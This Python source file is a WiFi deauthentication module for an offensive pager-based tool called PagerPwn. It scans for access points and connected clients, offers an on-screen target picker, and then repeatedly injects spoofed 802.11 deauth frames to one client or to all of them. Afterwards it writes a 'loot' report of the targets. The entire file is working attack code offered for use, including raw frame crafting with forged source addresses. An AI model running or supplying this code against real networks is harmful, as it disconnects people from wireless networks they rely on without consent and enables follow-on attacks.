"""
wifi_deauth.py - WiFi Deauthentication Module for PagerPwn

Active WiFi deauth attack. Scans for APs + clients via monitor mode,
then lets the operator pick a target and blast deauth frames.

Uses phy0 (2.4GHz) monitor interface — reuses wifi_scan's interface
management and frame parsing.

Flow:
  1. Setup monitor interface (reuse from wifi_scan)
  2. Quick passive scan (~15s) to discover APs + clients
  3. Interactive target selection on pager LCD
  4. Deauth injection loop with live stats
  5. Cleanup + save loot

Module interface: run(config, ui_callback, stop_event, pager=None) -> dict
"""

import os
import struct
import socket
import subprocess
import threading
import time
from datetime import datetime

from pagerctl import Pager

from modules.wifi_scan import (
    _find_existing_mon, _create_mon_iface, _destroy_mon_iface,
    _parse_frame, _channel_hopper,
    ALL_CHANNELS, MON_IFACE, IW,
)

# ── Deauth frame constants ───────────────────────────────────────────────────
BROADCAST_MAC = b"\xff\xff\xff\xff\xff\xff"
REASON_CODE = 7  # Class 3 frame from non-associated station

# Scan duration before showing target picker
SCAN_DURATION = 15  # seconds

# Deauth burst config
BURST_COUNT = 5      # frames per burst
BURST_DELAY = 0.100  # seconds between bursts

# 802.11 data frame subtype for client association detection
SUBTYPE_DATA       = 0x08
SUBTYPE_QOS_DATA   = 0x88
SUBTYPE_NULL       = 0x48
SUBTYPE_QOS_NULL   = 0xC8


# ── Deauth frame crafting ────────────────────────────────────────────────────

def _build_deauth_frame(dst_mac, src_mac, bssid_mac, reason=REASON_CODE):
    """Build a raw 802.11 deauth frame with minimal radiotap header.

    Args:
        dst_mac: destination MAC (6 bytes)
        src_mac: source MAC (6 bytes, spoofed)
        bssid_mac: BSSID (6 bytes)
        reason: reason code (int)

    Returns:
        bytes: complete frame ready for injection
    """
    # Minimal radiotap header (8 bytes)
    radiotap = struct.pack("<BBHI", 0, 0, 8, 0)

    # 802.11 deauth frame
    frame_control = struct.pack("<H", 0x00C0)  # deauth
    duration = struct.pack("<H", 0x0000)
    seq_ctrl = struct.pack("<H", 0x0000)
    reason_bytes = struct.pack("<H", reason)

    frame = (
        radiotap
        + frame_control
        + duration
        + dst_mac       # addr1: destination
        + src_mac       # addr2: source (spoofed)
        + bssid_mac     # addr3: BSSID
        + seq_ctrl
        + reason_bytes
    )
    return frame


def _mac_to_bytes(mac_str):
    """Convert 'aa:bb:cc:dd:ee:ff' to 6-byte bytes."""
    return bytes(int(b, 16) for b in mac_str.split(":"))


# ── Enhanced capture that also tracks client-AP associations ─────────────────

def _parse_data_frame(data, associations):
    """Parse data frames to find client<->AP associations.
    Updates associations dict: {client_mac: set(bssid, ...)}"""
    from modules.wifi_scan import _parse_radiotap

    rt_len, signal = _parse_radiotap(data)
    if rt_len is None:
        return

    frame = data[rt_len:]
    if len(frame) < 24:
        return

    fc = struct.unpack_from("<H", frame, 0)[0]
    subtype = fc & 0xFC

    # Check if it's a data frame (type 2, subtypes 0x08, 0x88, 0x48, 0xC8)
    if subtype not in (SUBTYPE_DATA, SUBTYPE_QOS_DATA, SUBTYPE_NULL, SUBTYPE_QOS_NULL):
        return

    # To DS / From DS flags
    to_ds = (fc >> 8) & 0x01
    from_ds = (fc >> 8) & 0x02

    if to_ds and not from_ds:
        # Client -> AP: addr1=BSSID, addr2=SA(client), addr3=DA
        bssid = ":".join(f"{b:02x}" for b in frame[4:10])
        client = ":".join(f"{b:02x}" for b in frame[10:16])
    elif from_ds and not to_ds:
        # AP -> Client: addr1=DA(client), addr2=BSSID, addr3=SA
        client = ":".join(f"{b:02x}" for b in frame[4:10])
        bssid = ":".join(f"{b:02x}" for b in frame[10:16])
    else:
        return

    # Skip broadcast/multicast
    if client.startswith("ff:ff:ff") or client.startswith("33:33:"):
        return
    # Skip if client MAC first octet has multicast bit set
    if int(client.split(":")[0], 16) & 0x01:
        return

    associations.setdefault(client, set()).add(bssid)


def _capture_loop_deauth(iface, stop_event, aps, clients, associations):
    """Capture loop that tracks both APs/clients (via wifi_scan) and associations."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((iface, 0))
        sock.settimeout(1.0)
    except Exception:
        return

    while not stop_event.is_set():
        try:
            data = sock.recv(4096)
        except socket.timeout:
            continue
        except Exception:
            break

        try:
            _parse_frame(data, aps, clients)
        except Exception:
            pass

        try:
            _parse_data_frame(data, associations)
        except Exception:
            pass

    sock.close()


# ── Channel lock ─────────────────────────────────────────────────────────────

def _set_channel(iface, channel):
    """Lock monitor interface to a specific channel."""
    try:
        subprocess.run(
            [IW, "dev", iface, "set", "channel", str(channel)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=2, check=True,
        )
        return True
    except Exception:
        return False


# ── LCD helpers ──────────────────────────────────────────────────────────────

def _draw_scan_progress(pager, aps, associations, elapsed, total):
    """Show scan progress screen."""
    pager.clear(pager.BLACK)

    # Header
    pager.fill_rect(0, 0, 480, 20, pager.rgb(180, 0, 0))
    pager.draw_text(4, 2, "WIFI DEAUTH - SCANNING", pager.WHITE, 2)

    # Progress bar
    bar_w = int(400 * (elapsed / total))
    pager.fill_rect(40, 40, 400, 12, pager.rgb(60, 60, 60))
    pager.fill_rect(40, 40, min(bar_w, 400), 12, pager.rgb(180, 0, 0))

    pct = min(int(elapsed / total * 100), 100)
    pager.draw_text(200, 58, f"{pct}%", pager.WHITE, 2)

    # Stats
    n_aps = len(aps)
    # Count total unique clients associated to APs
    n_clients = len(associations)
    pager.draw_text(40, 90, f"APs found: {n_aps}", pager.CYAN, 2)
    pager.draw_text(40, 120, f"Clients seen: {n_clients}", pager.CYAN, 2)

    pager.draw_text_centered(180, "Scanning for targets...", pager.GRAY, 1)

    pager.flip()


def _draw_ap_picker(pager, sorted_aps, client_counts, cursor):
    """Draw AP selection screen. client_counts is {bssid: int}."""
    pager.clear(pager.BLACK)

    # Header
    pager.fill_rect(0, 0, 480, 20, pager.rgb(180, 0, 0))
    pager.draw_text(4, 2, "SELECT TARGET AP", pager.WHITE, 2)

    ROW_H = 24
    MAX_ROWS = 7
    # Scroll window centered on cursor
    start = max(0, cursor - MAX_ROWS // 2)
    if start + MAX_ROWS > len(sorted_aps):
        start = max(0, len(sorted_aps) - MAX_ROWS)
    visible = sorted_aps[start:start + MAX_ROWS]

    y = 24
    for i, ap in enumerate(visible):
        idx = start + i
        ssid = ap["ssid"] or "<hidden>"
        if len(ssid) > 16:
            ssid = ssid[:15] + "~"
        bssid = ap["bssid"]
        ch = ap["channel"] if ap["channel"] else "?"
        sig = ap["signal"]
        enc = ap["enc"]
        n_cl = client_counts.get(bssid, 0)

        if idx == cursor:
            pager.fill_rect(0, y, 480, ROW_H, pager.rgb(180, 0, 0))
            fg = pager.WHITE
        else:
            fg = pager.CYAN if sig > -70 else pager.GRAY

        line = f"{ssid:<16s} {bssid}  ch{ch:<3} {sig}dBm {enc:<4s} [{n_cl}]"
        pager.draw_text(4, y + 3, line, fg, 1)
        y += ROW_H

    # Footer
    pager.fill_rect(0, 200, 480, 22, pager.rgb(40, 40, 40))
    pager.draw_text(4, 203, f"[UP/DN] [LT/RT]Page  [A] Select  [B] Back  {cursor+1}/{len(sorted_aps)}", pager.GRAY, 1)

    pager.flip()


def _draw_client_picker(pager, ap_ssid, ap_bssid, client_list, cursor):
    """Draw client selection screen. cursor=0 is ALL CLIENTS."""
    pager.clear(pager.BLACK)

    # Header
    pager.fill_rect(0, 0, 480, 20, pager.rgb(180, 0, 0))
    ssid_disp = ap_ssid or "<hidden>"
    if len(ssid_disp) > 20:
        ssid_disp = ssid_disp[:19] + "~"
    pager.draw_text(4, 2, f"CLIENTS: {ssid_disp}", pager.WHITE, 2)

    ROW_H = 24
    # Entry 0 = ALL CLIENTS, then individual clients
    entries = ["ALL CLIENTS"] + client_list
    MAX_ROWS = 7
    start = max(0, cursor - MAX_ROWS // 2)
    if start + MAX_ROWS > len(entries):
        start = max(0, len(entries) - MAX_ROWS)
    visible = entries[start:start + MAX_ROWS]

    y = 24
    for i, entry in enumerate(visible):
        idx = start + i
        if idx == cursor:
            pager.fill_rect(0, y, 480, ROW_H, pager.rgb(180, 0, 0))
            fg = pager.WHITE
        else:
            fg = pager.CYAN

        if idx == 0:
            pager.draw_text(4, y + 3, ">> ALL CLIENTS <<", fg, 2)
        else:
            pager.draw_text(4, y + 3, f"  {entry}", fg, 2)
        y += ROW_H

    # Footer
    pager.fill_rect(0, 200, 480, 22, pager.rgb(40, 40, 40))
    pager.draw_text(4, 203, f"[UP/DN] [LT/RT]Page  [A] Select  [B] Back  {cursor+1}/{len(entries)}", pager.GRAY, 1)

    pager.flip()


def _draw_deauth_screen(pager, ap_ssid, ap_bssid, target_client, channel,
                         pkts_sent, start_time, pulse_on):
    """Draw live deauth attack screen."""
    pager.clear(pager.BLACK)

    # Header - red bar
    pager.fill_rect(0, 0, 480, 22, pager.rgb(220, 0, 0))
    pager.draw_text(4, 3, "!! WIFI DEAUTH ACTIVE !!", pager.WHITE, 2)

    # Target info
    ssid_disp = ap_ssid or "<hidden>"
    if len(ssid_disp) > 24:
        ssid_disp = ssid_disp[:23] + "~"
    pager.draw_text(10, 30, f"SSID: {ssid_disp}", pager.CYAN, 2)
    pager.draw_text(10, 54, f"BSSID: {ap_bssid}", pager.CYAN, 2)

    if target_client:
        pager.draw_text(10, 78, f"CLIENT: {target_client}", pager.YELLOW, 2)
    else:
        pager.draw_text(10, 78, "CLIENT: ALL CLIENTS", pager.rgb(255, 100, 0), 2)

    pager.draw_text(10, 102, f"CHANNEL: {channel}", pager.GREEN, 2)

    # Stats
    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    pager.draw_text(10, 134, f"PACKETS: {pkts_sent}", pager.WHITE, 2)
    pager.draw_text(280, 134, f"TIME: {mins:02d}:{secs:02d}", pager.WHITE, 2)

    # Pulsing indicator
    if pulse_on:
        pager.fill_rect(430, 30, 40, 40, pager.rgb(255, 0, 0))
        pager.draw_text(438, 40, "TX", pager.WHITE, 2)

    # Status bar
    pager.fill_rect(0, 200, 480, 22, pager.rgb(60, 0, 0))
    pager.draw_text(4, 203, "[B-HOLD] STOP", pager.WHITE, 1)
    pager.draw_text(320, 203, f"{BURST_COUNT}x burst @ {int(1000*BURST_DELAY)}ms", pager.GRAY, 1)

    pager.flip()


# ── Main entry point ─────────────────────────────────────────────────────────

def run(config, ui_callback, stop_event, pager=None):
    """
    WiFi Deauthentication attack module.

    Args:
        config: PagerPwn config dict
        ui_callback: function(line1, line2) for status updates
        stop_event: threading.Event — set to abort
        pager: Pager object for direct LCD drawing

    Returns:
        dict with attack results
    """
    if pager is None:
        ui_callback("[WIFI DEAUTH]", "No pager ref - can't draw")
        time.sleep(2)
        return {"error": "no_pager"}

    # ── Phase 1: Setup monitor interface ─────────────────────────────────
    we_created_it = False
    iface = _find_existing_mon()
    if iface:
        ui_callback("[DEAUTH]", f"Using {iface}")
    else:
        ui_callback("[DEAUTH]", f"Creating {MON_IFACE}...")
        iface = _create_mon_iface()
        if not iface:
            ui_callback("[DEAUTH]", "Failed to create monitor iface")
            time.sleep(2)
            return {"error": "no_monitor"}
        we_created_it = True
        ui_callback("[DEAUTH]", f"{iface} up (2.4GHz)")
    time.sleep(0.3)

    # ── Phase 2: Quick scan ──────────────────────────────────────────────
    aps = {}
    clients = {}
    associations = {}  # client_mac -> set(bssid)
    current_channel = {"ch": 1}
    scan_stop = threading.Event()
    scan_start = time.time()

    cap_thread = threading.Thread(
        target=_capture_loop_deauth,
        args=(iface, scan_stop, aps, clients, associations),
        daemon=True,
    )
    hop_thread = threading.Thread(
        target=_channel_hopper,
        args=(iface, scan_stop, current_channel),
        daemon=True,
    )
    cap_thread.start()
    hop_thread.start()

    # Show scan progress
    pager.clear_input_events()
    while not (stop_event and stop_event.is_set()):
        elapsed = time.time() - scan_start
        if elapsed >= SCAN_DURATION:
            break
        _draw_scan_progress(pager, aps, associations, elapsed, SCAN_DURATION)

        # Allow early exit with B
        event = pager.get_input_event()
        if event:
            btn, etype, _ = event
            if btn == Pager.BTN_B and etype == Pager.EVENT_PRESS:
                scan_stop.set()
                cap_thread.join(timeout=3)
                hop_thread.join(timeout=3)
                if we_created_it:
                    _destroy_mon_iface(iface)
                return {"aborted": True}

        time.sleep(0.25)

    # Stop scan threads
    scan_stop.set()
    cap_thread.join(timeout=3)
    hop_thread.join(timeout=3)

    if not aps:
        pager.clear(pager.BLACK)
        pager.draw_text_centered(100, "NO APs FOUND", pager.RED, 2)
        pager.flip()
        time.sleep(2)
        if we_created_it:
            _destroy_mon_iface(iface)
        return {"error": "no_aps", "scan_duration": SCAN_DURATION}

    # ── Phase 3: Target selection ────────────────────────────────────────

    # Sort APs by signal (strongest first), attach bssid to each entry
    sorted_aps = []
    for bssid, info in aps.items():
        entry = dict(info)
        entry["bssid"] = bssid
        sorted_aps.append(entry)
    sorted_aps.sort(key=lambda a: a["signal"], reverse=True)

    # --- AP picker ---
    cursor = 0
    pager.clear_input_events()
    selected_ap = None

    # Pre-compute client counts so we don't recalculate on every redraw
    ap_client_counts = {}
    for ap in sorted_aps:
        bssid = ap["bssid"]
        ap_client_counts[bssid] = sum(1 for cl, bssids in associations.items() if bssid in bssids)

    _draw_ap_picker(pager, sorted_aps, ap_client_counts, cursor)

    while not (stop_event and stop_event.is_set()):
        event = pager.get_input_event()
        if not event:
            time.sleep(0.02)
            continue
        btn, etype, _ = event
        if etype != Pager.EVENT_PRESS:
            continue
        n_aps = len(sorted_aps)
        if btn == Pager.BTN_UP:
            cursor = (cursor - 1) % n_aps
            pager.beep(400, 15)
            _draw_ap_picker(pager, sorted_aps, ap_client_counts, cursor)
        elif btn == Pager.BTN_DOWN:
            cursor = (cursor + 1) % n_aps
            pager.beep(400, 15)
            _draw_ap_picker(pager, sorted_aps, ap_client_counts, cursor)
        elif btn == Pager.BTN_LEFT:
            cursor = (cursor - 7) % n_aps
            pager.beep(500, 20)
            _draw_ap_picker(pager, sorted_aps, ap_client_counts, cursor)
        elif btn == Pager.BTN_RIGHT:
            cursor = (cursor + 7) % n_aps
            pager.beep(500, 20)
            _draw_ap_picker(pager, sorted_aps, ap_client_counts, cursor)
        elif btn == Pager.BTN_A:
            selected_ap = sorted_aps[cursor]
            pager.beep(800, 40)
            break
        elif btn == Pager.BTN_B:
            pager.beep(300, 30)
            if we_created_it:
                _destroy_mon_iface(iface)
            return {"aborted": True}

    if selected_ap is None:
        if we_created_it:
            _destroy_mon_iface(iface)
        return {"aborted": True}

    target_bssid = selected_ap["bssid"]
    target_ssid = selected_ap["ssid"]
    target_channel = selected_ap["channel"]

    # --- Client picker ---
    # Find clients associated with this AP
    ap_clients = [cl for cl, bssids in associations.items() if target_bssid in bssids]
    ap_clients.sort()

    cursor = 0  # 0 = ALL CLIENTS
    pager.clear_input_events()
    target_client = None  # None = all clients
    _draw_client_picker(pager, target_ssid, target_bssid, ap_clients, cursor)

    while not (stop_event and stop_event.is_set()):
        event = pager.get_input_event()
        if not event:
            time.sleep(0.02)
            continue
        btn, etype, _ = event
        if etype != Pager.EVENT_PRESS:
            continue
        n_entries = len(ap_clients) + 1  # +1 for ALL CLIENTS
        if btn == Pager.BTN_UP:
            cursor = (cursor - 1) % n_entries
            pager.beep(400, 15)
            _draw_client_picker(pager, target_ssid, target_bssid, ap_clients, cursor)
        elif btn == Pager.BTN_DOWN:
            cursor = (cursor + 1) % n_entries
            pager.beep(400, 15)
            _draw_client_picker(pager, target_ssid, target_bssid, ap_clients, cursor)
        elif btn == Pager.BTN_LEFT:
            cursor = (cursor - 7) % n_entries
            pager.beep(500, 20)
            _draw_client_picker(pager, target_ssid, target_bssid, ap_clients, cursor)
        elif btn == Pager.BTN_RIGHT:
            cursor = (cursor + 7) % n_entries
            pager.beep(500, 20)
            _draw_client_picker(pager, target_ssid, target_bssid, ap_clients, cursor)
        elif btn == Pager.BTN_A:
            if cursor == 0:
                target_client = None  # ALL
            else:
                target_client = ap_clients[cursor - 1]
            pager.beep(800, 40)
            break
        elif btn == Pager.BTN_B:
            pager.beep(300, 30)
            if we_created_it:
                _destroy_mon_iface(iface)
            return {"aborted": True}

    # ── Phase 4: Deauth attack ───────────────────────────────────────────

    # Lock to target channel
    if target_channel:
        _set_channel(iface, target_channel)
        time.sleep(0.1)

    # Open raw socket for injection
    try:
        inject_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        inject_sock.bind((iface, 0))
    except Exception as e:
        pager.clear(pager.BLACK)
        pager.draw_text_centered(100, "INJECT SOCKET FAIL", pager.RED, 2)
        pager.flip()
        time.sleep(2)
        if we_created_it:
            _destroy_mon_iface(iface)
        return {"error": "inject_socket"}

    # Build frames
    bssid_bytes = _mac_to_bytes(target_bssid)
    pkts_sent = 0
    attack_start = time.time()
    pulse_on = True

    # Pulse the A-button LED red
    try:
        pager.set_led("a", 255, 0, 0)
    except Exception:
        pass

    pager.clear_input_events()

    while not (stop_event and stop_event.is_set()):
        # Check for B press to stop
        event = pager.get_input_event()
        if event:
            btn, etype, _ = event
            if btn == Pager.BTN_B and etype == Pager.EVENT_PRESS:
                pager.beep(200, 100)
                break

        # Send deauth burst
        for _ in range(BURST_COUNT):
            if target_client:
                # Targeted: deauth specific client
                client_bytes = _mac_to_bytes(target_client)
                # AP -> Client (spoofed as AP)
                frame1 = _build_deauth_frame(client_bytes, bssid_bytes, bssid_bytes)
                # Client -> AP (spoofed as client)
                frame2 = _build_deauth_frame(bssid_bytes, client_bytes, bssid_bytes)
                try:
                    inject_sock.sendto(frame1, (iface, 0))
                    pkts_sent += 1
                    inject_sock.sendto(frame2, (iface, 0))
                    pkts_sent += 1
                except Exception:
                    pass
            else:
                # Broadcast deauth (all clients)
                # AP -> Broadcast
                frame1 = _build_deauth_frame(BROADCAST_MAC, bssid_bytes, bssid_bytes)
                try:
                    inject_sock.sendto(frame1, (iface, 0))
                    pkts_sent += 1
                except Exception:
                    pass
                # Also deauth each known client individually
                for cl_mac in ap_clients:
                    cl_bytes = _mac_to_bytes(cl_mac)
                    frame2 = _build_deauth_frame(cl_bytes, bssid_bytes, bssid_bytes)
                    frame3 = _build_deauth_frame(bssid_bytes, cl_bytes, bssid_bytes)
                    try:
                        inject_sock.sendto(frame2, (iface, 0))
                        pkts_sent += 1
                        inject_sock.sendto(frame3, (iface, 0))
                        pkts_sent += 1
                    except Exception:
                        pass

        # Update display
        pulse_on = not pulse_on
        _draw_deauth_screen(
            pager, target_ssid, target_bssid, target_client,
            target_channel, pkts_sent, attack_start, pulse_on,
        )

        time.sleep(BURST_DELAY)

    # ── Phase 5: Cleanup ─────────────────────────────────────────────────

    inject_sock.close()

    # Turn off LED
    try:
        pager.set_led("a", 0, 0, 0)
    except Exception:
        pass

    # Tear down monitor iface if we created it
    if we_created_it:
        _destroy_mon_iface(iface)

    attack_duration = int(time.time() - attack_start)

    # Save loot
    loot_dir = config.get("LOOT_DIR", "/mmc/root/loot/pagerpwn")
    os.makedirs(loot_dir, exist_ok=True)

    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    loot_lines = [
        f"WIFI DEAUTH REPORT",
        f"==================",
        f"Date:           {datetime.now().isoformat()}",
        f"Interface:      {iface}",
        f"Duration:       {attack_duration}s",
        f"",
        f"TARGET",
        f"------",
        f"SSID:           {target_ssid or '<hidden>'}",
        f"BSSID:          {target_bssid}",
        f"Channel:        {target_channel}",
        f"Client:         {target_client or 'ALL CLIENTS'}",
        f"",
        f"RESULTS",
        f"-------",
        f"Packets sent:   {pkts_sent}",
    ]
    if ap_clients:
        loot_lines.append(f"")
        loot_lines.append(f"ASSOCIATED CLIENTS ({len(ap_clients)})")
        loot_lines.append(f"-------------------")
        for cl in ap_clients:
            loot_lines.append(f"  {cl}")

    loot_path = os.path.join(loot_dir, f"wifi_deauth_{ts}.txt")
    try:
        with open(loot_path, "w") as f:
            f.write("\n".join(loot_lines) + "\n")
    except Exception:
        pass

    ui_callback(
        f"[DEAUTH] {pkts_sent} pkts sent",
        f"{target_ssid or target_bssid} ({attack_duration}s)",
    )

    return {
        "target_ssid": target_ssid,
        "target_bssid": target_bssid,
        "target_client": target_client,
        "packets_sent": pkts_sent,
        "duration": attack_duration,
        "clients": ap_clients,
    }
